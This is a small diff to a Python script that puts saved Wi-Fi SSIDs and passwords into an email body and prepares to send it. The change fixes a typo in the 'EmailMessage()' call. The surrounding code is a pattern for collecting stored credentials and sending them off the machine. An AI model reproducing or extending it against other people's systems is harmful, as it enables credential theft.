@@ -52,7 +52,7 @@ for item in wifi_list:
     email_message += f"SSID: {item['ssid']}, Password: {item['password']}\n"
 
 # Create EmailMessage Object
-email = EmailMessagessid
+email = EmailMessage()
 # Who is the email from
 email["from"] = "name_of_sender"
 # To which email you want to send the email
